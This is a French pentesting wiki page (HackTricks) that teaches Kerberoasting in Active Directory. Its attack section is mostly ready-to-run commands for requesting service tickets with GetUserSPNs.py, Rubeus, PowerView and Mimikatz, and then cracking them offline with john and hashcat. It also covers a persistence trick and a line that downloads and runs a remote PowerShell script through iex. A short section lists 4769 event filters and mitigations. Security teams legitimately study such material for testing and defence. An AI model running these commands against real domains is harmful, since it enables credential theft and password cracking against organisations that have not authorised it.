## Kerberoast

Le but de la technique de **Kerberoasting** est de collecter des tickets TGS pour les services qui s'exécutent au nom des comptes d'utilisateurs dans l'AD, et non des comptes d'ordinateurs. Ainsi, une **partie** de ces tickets TGS sont **chiffrés** avec des **clés** dérivées des mots de passe des utilisateurs. Par conséquent, leurs informations d'identification pourraient être **craquées hors ligne**.\
Vous pouvez savoir qu'un compte d'**utilisateur** est utilisé comme un **service** car la propriété **"ServicePrincipalName"** n'est **pas nulle**.

Par conséquent, pour effectuer Kerberoasting, seul un compte de domaine qui peut demander des TGS est nécessaire, ce qui peut être n'importe qui car aucun privilège spécial n'est requis.

**Vous avez besoin de justificatifs de connexion valides à l'intérieur du domaine.**

### **Attaque**

{% hint style="warning" %}
Les outils de **Kerberoasting** demandent généralement le **`chiffrement RC4`** lors de l'exécution de l'attaque et de l'initialisation des demandes TGS-REQ. Cela est dû au fait que **RC4 est** [**plus faible**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) et plus facile à craquer hors ligne à l'aide d'outils tels que Hashcat que d'autres algorithmes de chiffrement tels que AES-128 et AES-256.\
Les hachages RC4 (type 23) commencent par **`$krb5tgs$23$*`** tandis que les AES-256 (type 18) commencent par **`$krb5tgs$18$*`**`.
{% endhint %}

#### **Linux**
```bash
msf> use auxiliary/gather/get_user_spns
GetUserSPNs.py -request -dc-ip 192.168.2.160 <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip 192.168.2.160 -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
```
#### Windows

* **Énumérer les utilisateurs Kerberoastables**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technique 1 : Demander le TGS et le décharger de la mémoire**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technique 2: Outils automatiques**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Lorsqu'un TGS est demandé, l'événement Windows `4769 - Une demande de ticket de service Kerberos a été effectuée` est généré.
{% endhint %}



![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Craquage
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistance

Si vous avez **suffisamment de permissions** sur un utilisateur, vous pouvez le rendre **kerberoastable** :
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Vous pouvez trouver des **outils** utiles pour les attaques **kerberoast** ici: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si vous rencontrez cette **erreur** depuis Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** c'est à cause de votre heure locale, vous devez synchroniser l'hôte avec le DC. Il y a quelques options:
- `ntpdate <IP du DC>` - Déconseillé depuis Ubuntu 16.04
- `rdate -n <IP du DC>`

### Atténuation

Kerberoast est très discret s'il est exploitable

* ID d'événement de sécurité 4769 - Un ticket Kerberos a été demandé
* Étant donné que 4769 est très fréquent, filtrons les résultats:
* Le nom du service ne doit pas être krbtgt
* Le nom du service ne se termine pas par $ (pour filtrer les comptes machine utilisés pour les services)
* Le nom du compte ne doit pas être machine@domain (pour filtrer les demandes provenant de machines)
* Le code d'erreur doit être '0x0' (pour filtrer les échecs, 0x0 est un succès)
* Le type de chiffrement du ticket est surtout 0x17
* Atténuation:
* Les mots de passe du compte de service doivent être difficiles à deviner (plus de 25 caractères)
* Utilisez des comptes de service gérés (changement automatique de mot de passe périodique et gestion déléguée des SPN)
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
**Plus d'informations sur Kerberoasting sur ired.team** [**ici**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**et** [**ici**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**.**

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
